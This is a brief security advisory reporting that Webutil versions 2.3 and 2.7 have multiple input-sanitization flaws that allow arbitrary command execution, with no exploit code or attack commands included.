Webutil is prone to multiple vulnerabilities that attackers can leverage to execute arbitrary commands. These issues occur because the application fails to adequately sanitize user-supplied input.

Successful attacks can compromise the affected application and possibly the underlying computer.

These issues affect Webutil 2.3 and 2.7.
